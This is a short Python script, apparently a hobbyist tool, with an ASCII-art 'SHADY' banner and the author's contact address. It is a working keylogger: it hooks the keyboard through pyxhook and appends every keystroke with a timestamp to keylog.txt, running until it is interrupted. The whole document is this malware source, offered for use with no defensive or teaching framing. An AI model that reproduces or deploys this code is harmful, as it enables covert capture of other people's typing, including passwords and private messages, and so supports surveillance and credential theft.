#!/usr/bin/python
# -*- coding: utf-8 -*-

print(
"""
 .oooooo..o ooooo   ooooo       .o.       oooooooooo.   oooooo   oooo 
d8P'    `Y8 `888'   `888'      .888.      `888'   `Y8b   `888.   .8'  
Y88bo.       888     888      .8"888.      888      888   `888. .8'   
 `"Y8888o.   888ooooo888     .8' `888.     888      888    `888.8'    
     `"Y88b  888     888    .88ooo8888.    888      888     `888'     
oo     .d8P  888     888   .8'     `888.   888     d88'      888      
8""88888P'  o888o   o888o o88o     o8888o o888bood8P'       o888o     
                                                 ping me --gsaran1209@gmail.com   
""")
import pyxhook
import time
import sys
import signal

# Create a hook manager
hookman = pyxhook.HookManager()

# Define a function to handle keyboard events
def on_key_press(event):
    # Get the current timestamp
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    # Create a log file if it doesn't exist
    log_file = "keylog.txt"
    with open(log_file, "a") as f:
        # Write the key press event to the log file
        f.write(f"{timestamp} - Key pressed: {event.Key}\n")

# Define a function to handle keyboard interrupts
def signal_handler(sig, frame):
    print("\nLove you 3000, Shady!")
    hookman.cancel()
    sys.exit(0)

# Set the hook
hookman.HookKeyboard()
hookman.KeyDown = on_key_press

# Set the signal handler
signal.signal(signal.SIGINT, signal_handler)

# Start the hook
hookman.start()

# Keep the hook running indefinitely
while True:
    time.sleep(1)
